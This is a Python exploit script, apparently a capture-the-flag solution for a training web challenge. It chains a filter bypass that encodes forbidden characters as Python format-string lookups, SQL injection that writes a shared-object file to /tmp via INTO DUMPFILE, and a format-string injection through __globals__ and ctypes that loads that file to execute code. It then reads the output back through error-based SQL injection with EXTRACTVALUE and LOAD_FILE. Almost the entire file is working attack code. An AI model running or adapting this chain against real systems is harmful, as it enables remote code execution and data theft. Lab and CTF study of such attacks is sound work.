import string, requests, binascii, re

URL = 'https://web-doubles.training.bksec.vn:8000/'
#============= Grep error ====================================================================

pattern = r'<li\ class="flash\-error">[\s\S]*?</li>'
def grep_error(response):
    result = re.findall(pattern,response)
    if result:
        print(result[0])
    else:
        print("No error found.")
    return

#============= Generate valid SQL query ======================================================
FORBIDDEN_CHARACTERS = ['"', "(", ")", " ", "," , "'", "\\", "/", "*", "+" "%", "-", ";", "#"] # length = 13
variable = dict(zip(FORBIDDEN_CHARACTERS, string.ascii_lowercase))

def gen_payload(a):
    var = variable[a]
    idx = FORBIDDEN_CHARACTERS.index(a)
    #username = '{x}{x.FORBIDDEN_CHARACTERS[5]}'    
    return f"{{{var}}}{{{var}.FORBIDDEN_CHARACTERS[{idx}]}}"

def encode(sql):
    pay_load = ""
    
    for i in sql:
        if i in variable:
            pay_load += gen_payload(i)
        else:
            pay_load += i
            
    return pay_load

#================ Write shared object (file .so) to the system ==============================

s = requests.Session()
hexed_payload = binascii.hexlify(open('exploit.so','rb').read()).decode()
destination = '/tmp/bbt.so'
username = encode(f"' UNION SELECT 0x{hexed_payload},'','' INTO DUMPFILE '{destination}'-- -")
r = s.post(url = URL, data = {'username':username, 'password': 'bbt'})

#================ Load shared library (file .so) to execute command ==============================

# Post-validation payload: {{x}}{{x.__init__.__globals__[ctypes].cdll[/tmp/bbt.so]}}
username = encode('{{x}}{{x.__init__.__globals__[ctypes].cdll[/tmp/bbt.so]}}')
r = s.post(url = URL, data = {'username':username, 'password': 'bbt'})

#================ Extract flag via Error-based SQLi ==============================

# HEX encode because single and double quotes are blocked
username = encode("' AND EXTRACTVALUE(1,CONCAT('~',LOAD_FILE('/tmp/bbt')))-- -")
r = s.post(url = URL, data = {'username':username, 'password': 'bbt'})
grep_error(r.text)